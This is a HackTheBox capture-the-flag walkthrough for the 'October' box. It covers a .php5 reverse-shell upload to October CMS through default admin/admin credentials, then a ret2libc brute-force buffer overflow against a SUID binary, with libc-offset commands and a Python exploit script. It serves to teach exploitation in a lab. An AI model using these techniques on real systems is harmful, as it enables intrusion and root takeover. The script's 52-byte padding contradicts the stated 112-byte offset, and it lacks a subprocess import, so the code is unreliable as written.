---
title: "HackTheBox Writeup: October"
date: 2019-08-23T02:49:21+02:00
tags:
  - hackthebox
  - ctf
  - writeup
showdate: true
toc: true
---

October is a Linux box with a difficulty rating from the HTB staff of 4.9 / 10, however the ratings from the members for getting user and root are the total opposites:

![img](/images/october-writeup/2.png)

The reason behind this is that the box starts fairly easy with normal web enumeration that leads to the discovery of an arbitrary PHP file upload vulnerability which gives us user access to the machine, then, in order to escalate our privileges we'll have to write a buffer overflow exploit to attack a vulnerable SUID binary, the exploit needs to bypass a non-executable stack and ASLR. So this should be fun!

![img](/images/october-writeup/1.png)

---

## Enumeration

Let's jump right in with a nmap scan, to perform a scan of common ports and have their services enumerated with the -sC flag, which runs a few basic scripts:

![img](/images/october-writeup/3.png)

We find OpenSSH behind port 22 and a Vanilla version of October CMS running on an Apache 2.4.7 web server. Let's take a closer look at the CMS in question because it's not too common:

![img](/images/october-writeup/4.png)

From the account management page we can create our own personal account, this can be used in the discussion forum, and then we also have a little blog with no articles at the moment. It doesn't look like there's any interesting stuff here, so let's browse exploit-db to see if there are any public exploits or known vulnerabilities for this CMS:

![img](/images/october-writeup/5.png)

And indeed there are some known vulnerabilities! Because XSS and CSRF aren't of much use in most CTF's we are going to focus on the last result instead, which simply states "multiple vulnerabilities". These vulnereabilties were disclosed in 2017, and the box was released on HackTheBox in 2017 as well, so it would make sense to assume our box is vulnerable to the issues here described. Perhaps the most interesting one of the lot described in detail is this:

![img](/images/october-writeup/6.png)

Apparently this CMS restricts file uploads with a blacklist of forbidden extensions, but .php5 isn't part of the blacklist, despite being a fully functional extension for PHP pages. The only drawback is that we need to be authenticated on the administration zone of the CMS in order to exploit this flaw, and of course we can't access that zone as normal users. However before giving up we can try fuzzing the web server in search for hidden pages and hidden content, in this case using dirb:

![img](/images/october-writeup/7.png)

On top of many other less interesting results we find a /backend page that redirects somewhere else (302 code), and that somewhere else turns out to be a login page for the administration area:

![img](/images/october-writeup/8.png)

At this point we could try using hydra to bruteforce the credentials, but we might as well do a few manual tries with common combinations of user/password, and in fact, at my very first try, those credentials reveal themselves as admin/admin:

![img](/images/october-writeup/9.png)

---

## Exploitation: PHP shell upload

So we can take advantage of the flaws we found before! First let's build a shell with msfvenom, we are going to need a PHP file, so I went for a meterpreter reverse shel:

![img](/images/october-writeup/10.png)

![img](/images/october-writeup/11.png)

Time to start a listener for our shell:

![img](/images/october-writeup/12.png)

And then we can head over to the Media section of the administrator area of the October CMS (1), upload our shell (2), and grab its public URL so we can load it on our browser (3):

![img](/images/october-writeup/13.png)

Load the URL and...

![img](/images/october-writeup/14.png)

We're in! We are under the www-data account but we can still access the only user's home folder, Harry's, where we find user.txt:

![img](/images/october-writeup/15.png)

So let's start enumerating a little bit after sending meterpreter a "shell" command to have easier access to the system's settings, because right now we don't need any of meterpreter's features:

![img](/images/october-writeup/16.png)

1. We start a normal shell session, so we don't have to follow meterpreter's weird command structure anymore
+ We get a semi-interactive shell thanks to Python by spawning a new instance of /bin/bash
+ One of the very first things I do when I gain access to a Linux box is look for SUID binaries
+ And in fact we find something very interesting, an executable called "ovrflw", clearing referencing buffer overflows, which is obviously what we are going to need to exploit in order to become root. If we exploit this program and spawn a shell during its execution we will become root, so it's in our best interest to examine this program from up close

---

## Preparing the exploit: gathering the data

Buffer overflows are very fun and rewarding vulnerabilities to exploit, but we need to know many things about the system we're working on before we can even attempt an attack. First of all we can use "readelf -l" to see if the binary we're dealing with has an executable stack:

![img](/images/october-writeup/17.png)

Nope, the stack program header only has the Read and Write flags set, but not the Execute flag, meaning DEP is enabled and we won't be able to inject a shellcode in the overflowing buffer and jump to it to execute arbitrary code. DEP can be bypassed of course, the easiest option being a ret2libc attack, where we jump to functions stored in the libc dynamic library, which is copied in its entirety in the address space of every Linux program during runtime. Something else we need to know is whether or not ASLR is enabled on this machine:

![img](/images/october-writeup/18.png)

Running ldd allows us to see which dynamic libraries an executables will load at runtime, we pipe the output of ldd to grep so we can filter out everything but the information regarding libc, which is what we are interested in. We can see that the memory address at which libc is being mapped changes every time, this means ASLR is enabled, and it's going to be an issue. ASLR randomizes the memory location where programs are loaded, and without knowing exactly where the data we need is stored, exploiting a buffer overflow vulnerability becomes much harder. Still not impossible though! We can still overcome this difficulty with a bit of extra work.

The easiest approach one could take is a simple bruteforce: we are going to hardcode a memory address in our exploit, one that we grab straight from the system, and the exploit is going to use that to refer to functions contained in libc. It's true that ASLR randomizes the address at which programs are loaded, but all the possible addresses aren't infinite, so if we give our exploit enough time, we can execute the program over and over again feeding it a malicious string containing the hardcoded memory addresses until we get the right address, and the exploitation is successful. This might take hundreds or thousands of tries, but we have both time and Python on our side! So let's start getting our hands dirty by downloading the binary on our machine:

![img](/images/october-writeup/19.png)

If we had any doubts we can now confirm the program is vulnerable to a buffer overflow, because if we give it a very long junk string with Python as input it causes a segmentation fault and exits:

![img](/images/october-writeup/20.png)

It's normal behavior is to... well.. do nothing. It asks for a string as argument but it doesn't even print it out:

![img](/images/october-writeup/21.png)

Alright let's load it up on gdb, and with the help of the PEDA.py plugin we can analyze it a little more in detail. In particular we are interested in knowing where exactly the crash happens, so we generate a never-repeating string with our good old pattern tools (or alternatively the *pattern* command from PEDA.py can also be used):

```shell-session
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
```

![img](/images/october-writeup/22.png)

And use that string as input for the program after it's been loaded in gdb:

![img](/images/october-writeup/23.png)

![img](/images/october-writeup/24.png)

As soon as the program is run it crashes because of a segmentation fault, and as we can see from the content of the EIP register we overwritten it with the value 0x64413764 which can be represented in ASCII like this: "d7Ad" so that part of our input string overwritten the instruction pointer, and when the program tried to jump to that address, since as we should already know EIP contains the address of the next instruction to be executed, but that value isn't a valid address thanks to our oversized buffer, so the program crashes. We know what string overwrote EIP, so we can use its hexadecimal value to know exactly at what offset of the entire string that sub-string is located, this will help us craft the exploit:

![img](/images/october-writeup/25.png)

The string was found exactly at offset 112, and that's exactly the amount of bytes of filler we are going to need for our exploit. After 112 bytes we are going to add to our buffer the memory address of the libc function we wish to call, in our case system() so we can spawn a shell, a return address that we don't really need so will consist of 4 bytes of junk, and finally the arguments to be passed to system(), which since we want to spawn a shell will be the string "/bin/sh".

As I said before we are going to follow the bruteforce way, running the program over and over again until our exploit with hardcoded addresses works, a very crude way to ignore ASLR, but hey, it works, so who cares! So let's go back to our October box and start gathering a few memory addresses to use for the exploit. First, we're going to need the base address of libc, we can obtain that using ldd like we did before to prove ASLR was enabled:

![img](/images/october-writeup/26.png)

So now we know that:

```shell-session
libc_address = 0xb75e8000
```

Now we need to know where the system function is located within libc, and we can find its offset address thanks to objdump:

```shell-session
objdump -TC /lib/i386-linux-gnu/libc.so.6 | grep " system$"
```

![img](/images/october-writeup/27.png)

0x00040310 is the offset from the base address of libc where system will be loaded, so in order to obtain the absolute address we must add the two:

```shell-session
system_address = 0xb75e8000 + 0x00040310 = 0xb7628310
```

Only thing left to obtain is the address of the "/bin/sh" string, which the strings command can find for us:

```shell-session
strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```

![img](/images/october-writeup/28.png)

And again this is just an offset, so for the full address we make another addition:

```shell-session
string_address = 0xb75e8000 + 0x00162bac = 0xb774abac
```
---

## Writing the exploit: putting it all together

Now that we have all this information we can finally write our exploit, which I have commented as best as I could:

```python
import struct
# address of system():
system_address = struct.pack("<I", 0xb7628310)
# junk return address, this is where execution will start
# when we close our shell, so it's none of our business
return_address = struct.pack("<I", 0xaabbccdd)
# address of /bin/sh:
string_address = struct.pack("<I", 0xb774abac)

# fill the buffer with junk and add all the parameters on top:
buffer = "A" * 52
buffer += system_address
buffer += return_address
buffer += string_address

tries = 0
# start an infinite loop to bruteforce the address:
while True:
	tries += 1
	# print the current number of tries every 10 attempts:
	if tries % 10 == 0:
		print "Attempts made: " + str(tries)
	# call the vulnerable program with our buffer as its only argument:
	subprocess.call(["/usr/local/bin/ovrflw", buffer])
	# once the address is bruteforced successfully the loop will stop
	# and we will have access to a root shell thanks to the SUID bit
```

The exploit is ready, we can upload it on October:

![img](/images/october-writeup/29.png)

And execute it:

![img](/images/october-writeup/30.png)

We obtain numerous errors but that's just what we knew was going to happen, after all our exploit is injecting bad addresses in the program, until eventually after about 110 tries... root shell!

This box was a lot of fun, especially the software exploitation part, for this was my first ASLR bypass exploit.








